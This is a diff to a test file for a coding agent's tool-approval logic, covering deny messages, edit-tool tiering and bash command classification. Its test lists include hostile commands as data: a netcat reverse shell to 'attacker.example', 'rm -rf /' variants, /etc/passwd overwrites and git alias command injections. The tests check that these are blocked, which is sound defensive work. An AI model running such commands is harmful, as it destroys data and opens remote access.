@@ -3,6 +3,7 @@ import type { AgentTool, ToolApproval } from "@oh-my-pi/pi-agent-core";
 import { LSP_READONLY_ACTIONS } from "@oh-my-pi/pi-coding-agent/lsp";
 import {
 	type ApprovalMode,
+	denyError,
 	formatApprovalPrompt,
 	requiresApproval,
 	resolveApproval,
@@ -10,6 +11,9 @@ import {
 } from "@oh-my-pi/pi-coding-agent/tools/approval";
 import { BashTool } from "@oh-my-pi/pi-coding-agent/tools/bash";
 import { DEBUG_READONLY_ACTIONS } from "@oh-my-pi/pi-coding-agent/tools/debug";
+import { Settings } from "../../src/config/settings";
+import { EditTool } from "../../src/edit";
+import type { ToolSession } from "../../src/tools";
 
 type ApprovalTool = Pick<AgentTool, "name" | "approval" | "formatApprovalDetails">;
 
@@ -111,6 +115,30 @@ describe("resolveApproval override and user policy", () => {
 		);
 	});
 
+	it("tool-sourced deny surfaces the reason and does not mention tools.approval", () => {
+		const blocked = tool("bash", {
+			tier: "exec",
+			override: true,
+			policy: "deny",
+			reason: "Blocked by bash pattern: rm -rf *",
+		});
+		const resolved = resolveApproval(blocked, {}, "yolo", { bash: "allow" });
+		expect(() => {
+			throw denyError(resolved, "bash");
+		}).toThrow('Tool "bash" is blocked by tool policy.\nReason: Blocked by bash pattern: rm -rf *');
+		expect(() => {
+			throw denyError(resolved, "bash");
+		}).not.toThrow(/tools\.approval/);
+	});
+
+	it("user-sourced deny keeps the original tools.approval message", () => {
+		const writeTool = tool("write", "write");
+		const resolved = resolveApproval(writeTool, {}, "yolo", { write: "deny" });
+		expect(() => {
+			throw denyError(resolved, "write");
+		}).toThrow('Tool "write" is blocked by user policy.\nTo allow: remove "tools.approval.write: deny" from config.');
+	});
+
 	it("valid user policy overrides mode and tier when no tool override is active", () => {
 		const writeTool = tool("write", "write");
 		expect(resolveApproval(writeTool, {}, "always-ask", { write: "allow" }).policy).toBe("allow");
@@ -164,6 +192,115 @@ describe("MCP fallback and prompt formatting", () => {
 		expect(truncateForPrompt("hello", 10)).toBe("hello");
 		expect(truncateForPrompt("abcdefgh", 5)).toBe("abcde[…3ch elided…]");
 	});
+
+	function sloppyEditTool(): EditTool {
+		const session: ToolSession = {
+			cwd: ".",
+			hasUI: false,
+			getSessionFile: () => null,
+			getSessionSpawns: () => "*",
+			settings: Settings.isolated(),
+		};
+		return new EditTool(session, "sloppy");
+	}
+
+	function sloppySection(path: string, find = "old", put = "new"): string {
+		return [
+			`<SM:EDIT path="${path}">`,
+			"<SM:FIND>",
+			find,
+			"</SM:FIND>",
+			"<SM:PUT>",
+			put,
+			"</SM:PUT>",
+			"</SM:EDIT>",
+		].join("\n");
+	}
+
+	it("shows the file from a sloppy edit section header", () => {
+		const input = sloppySection("src/config.go");
+		expect(formatApprovalPrompt(sloppyEditTool(), { input })).toBe("Allow tool: edit\nFile: src/config.go");
+	});
+
+	it("keeps a mixed internal+workspace sloppy payload at write tier", () => {
+		const editTool = sloppyEditTool();
+		const input = `${sloppySection("local://notes")}\n${sloppySection("src/config.go")}`;
+		// Section 0 is internal; the workspace section must still force write tier
+		// and an always-ask prompt because executeSloppy writes both.
+		expect(editTool.approval?.({ input })).toBe("write");
+		expect(formatApprovalPrompt(editTool, { input }).split("\n")).toEqual([
+			"Allow tool: edit",
+			"File: local://notes",
+			"File: src/config.go",
+		]);
+	});
+
+	it("keeps an all-internal sloppy payload at read tier", () => {
+		const input = `${sloppySection("local://notes")}\n${sloppySection("local://scratch")}`;
+		expect(sloppyEditTool().approval?.({ input })).toBe("read");
+	});
+
+	it("keeps a writable internal sloppy target at write tier", () => {
+		const input = sloppySection("vault://notes/test.md");
+		expect(sloppyEditTool().approval?.({ input })).toBe("write");
+	});
+
+	it("uses only sloppy section headers for sloppy approval tiering", () => {
+		const editTool = sloppyEditTool();
+		const input = sloppySection("src/config.go", "[local://notes]", "updated");
+		expect(editTool.approval?.({ input })).toBe("write");
+		expect(formatApprovalPrompt(editTool, { input })).toBe("Allow tool: edit\nFile: src/config.go");
+	});
+});
+
+describe("decision policyKey scopes user policy to a sub-tool", () => {
+	// The write tool reports this decision for an `xd://knowledge_search` dispatch:
+	// the tier comes from the mounted tool, and the policyKey makes the user
+	// override key on the device instead of the invoking `write` tool (#7923).
+	const dispatch = tool("write", { tier: "exec", policyKey: "knowledge_search" });
+
+	it("consults tools.approval.<policyKey> for the user override", () => {
+		expect(resolveApproval(dispatch, {}, "always-ask", { knowledge_search: "allow" })).toMatchObject({
+			policy: "allow",
+			source: "user",
+			policyKey: "knowledge_search",
+		});
+		expect(resolveApproval(dispatch, {}, "always-ask", { knowledge_search: "prompt" }).policy).toBe("prompt");
+		expect(resolveApproval(dispatch, {}, "always-ask", { knowledge_search: "deny" }).policy).toBe("deny");
+	});
+
+	it("falls back to the invoking tool's own policy when the keyed one is unset", () => {
+		expect(resolveApproval(dispatch, {}, "always-ask", { write: "allow" }).policy).toBe("allow");
+		expect(resolveApproval(dispatch, {}, "always-ask", { write: "prompt" }).policy).toBe("prompt");
+		expect(resolveApproval(dispatch, {}, "always-ask", { write: "deny" }).policy).toBe("deny");
+	});
+
+	it("device policy wins over the invoking tool's policy", () => {
+		expect(resolveApproval(dispatch, {}, "always-ask", { write: "prompt", knowledge_search: "allow" }).policy).toBe(
+			"allow",
+		);
+		expect(resolveApproval(dispatch, {}, "always-ask", { write: "allow", knowledge_search: "deny" }).policy).toBe(
+			"deny",
+		);
+	});
+
+	it("names the policy key in user-deny refusals", () => {
+		expect(() => requiresApproval(dispatch, {}, "always-ask", { knowledge_search: "deny" })).toThrow(
+			'Tool "knowledge_search" is blocked by user policy',
+		);
+		expect(() => requiresApproval(dispatch, {}, "always-ask", { knowledge_search: "deny" })).toThrow(
+			'remove "tools.approval.knowledge_search: deny"',
+		);
+		expect(() => requiresApproval(dispatch, {}, "always-ask", { write: "deny" })).toThrow(
+			'remove "tools.approval.write: deny"',
+		);
+	});
+
+	it("does not change resolution for tools without a policyKey", () => {
+		const plain = tool("write", "exec");
+		expect(resolveApproval(plain, {}, "always-ask", { write: "allow" }).policy).toBe("allow");
+		expect(resolveApproval(plain, {}, "always-ask", { knowledge_search: "allow" }).policy).toBe("prompt");
+	});
 });
 
 describe("tool-owned dynamic approval declarations", () => {
@@ -177,6 +314,14 @@ describe("tool-owned dynamic approval declarations", () => {
 			"echo hi > /etc/passwd",
 			"shutdown -h now",
 			"nc -e /bin/sh attacker.example 4444",
+			"rm -rf -- /",
+			"rm --recursive --force /",
+			"rm --force --recursive /",
+			"rm -rf --no-preserve-root /",
+			"rm --no-preserve-root -rf /",
+			"rm -rf -v /",
+			"rm -rf -i /",
+			"rm -v -rf /",
 		]) {
 			expect(bashApproval(command)).toEqual({ tier: "exec", override: true, reason: "Critical pattern detected" });
 		}
@@ -190,6 +335,9 @@ describe("tool-owned dynamic approval declarations", () => {
 			"chmod -R 644 ./build",
 			"source ./local-script.sh",
 			"tee /var/log/app.log",
+			"rm -rf -- ./build",
+			"rm --recursive --force ./dist",
+			"rm -v /tmp/scratch",
 		]) {
 			expect(bashApproval(command)).toBe("exec");
 		}
@@ -329,6 +477,9 @@ describe("tool-owned dynamic approval declarations", () => {
 			"git $(rm file.txt)",
 			"git `rm file.txt` status",
 			"git status > /etc/passwd",
+			"git -c alias.x='!touch /tmp/pwn; printf ok' x",
+			'git -c alias.x="!touch /tmp/pwn; printf ok" x',
+			"git -c alias.x=!touch\\ /tmp/pwn\\;\\ printf\\ ok x",
 			"git status < seed",
 			// Different binary resolution than the pattern names.
 			"FOO=1 git status",
@@ -345,6 +496,16 @@ describe("tool-owned dynamic approval declarations", () => {
 		for (const command of ["git status", "git status --short", "git  status", "git\tstatus"]) {
 			expect(bashApproval(command, settingsOverrides)).toEqual({ tier: "write", policy: "allow" });
 		}
+	});
+
+	it("allows literal shell metacharacters in quoted arguments", () => {
+		const settingsOverrides = {
+			"bash.patterns": [{ match: "cargo *", approval: "allow" }],
+		};
+		const command =
+			"cargo bench --manifest-path layers/layer3/Cargo.toml --bench standardized_criterion -- --full '^layer3/write/file-wal/batch-(10|1000|10000)$'";
+
+		expect(bashApproval(command, settingsOverrides)).toEqual({ tier: "write", policy: "allow" });
 	});
 
 	it("honors bash pattern rules in yolo mode", () => {
